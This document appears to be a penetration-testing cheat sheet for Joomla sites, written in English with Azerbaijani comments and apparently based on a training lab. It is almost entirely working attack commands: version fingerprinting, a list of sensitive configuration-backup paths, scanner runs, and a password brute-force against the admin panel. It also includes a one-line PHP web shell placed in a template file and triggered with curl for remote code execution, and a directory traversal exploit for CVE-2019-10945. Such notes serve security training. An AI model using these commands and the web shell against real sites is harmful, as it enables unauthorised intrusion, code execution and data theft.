# Discovery
```powershell
curl -s http://dev.inlanefreight.local/ | grep Joomla

curl -s https://target.com/robots.txt
# Tipik Joomla robots.txt
# Disallow: /administrator/
# Disallow: /cache/
# Disallow: /tmp/

curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format

curl -s https://target.com/administrator/manifests/files/joomla.xml | grep "<version>"
```

# Main Tabs
```powershell
# Admin panel
https://target.com/administrator/

# Login səhifəsi
https://target.com/administrator/index.php

# API (Joomla 4.x+)
https://target.com/api/index.php/v1/

# Config backup (olduqda həssas)
https://target.com/configuration.php
https://target.com/configuration.php.bak
https://target.com/configuration.php~

# Cache
https://target.com/cache/
https://target.com/tmp/
```

# Droopescan
```powershell
sudo pip3 install droopescan

droopescan scan joomla --url http://dev.inlanefreight.local/
```

# JoomlaScan
```powershell
python2 -m pip install bs4

python2 joomlascan.py -u http://dev.inlanefreight.local

sudo python3 joomla_brute.py -u http://app.inlanefreight.local -PL /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -U admin
```

# JoomlaScan
```powershell
sudo apt install joomscan

joomscan --url https://target.com

joomscan --url https://target.com \
         --enumerate-components \
         --random-agent \
         --proxy 127.0.0.1:8080

# Komponent siyahısı
joomscan --url https://target.com -ec

# Output fayla yaz
joomscan --url https://target.com \
         --output report.txt
```
---
<img width="898" height="577" alt="image" src="https://github.com/user-attachments/assets/8b79ef93-36d3-4fb9-8411-229d117113b4" />

# Remote Code Execution
```powershell
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);

curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

# Directory Traversal
```powershell
https://github.com/dpgg101/CVE-2019-10945

python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```
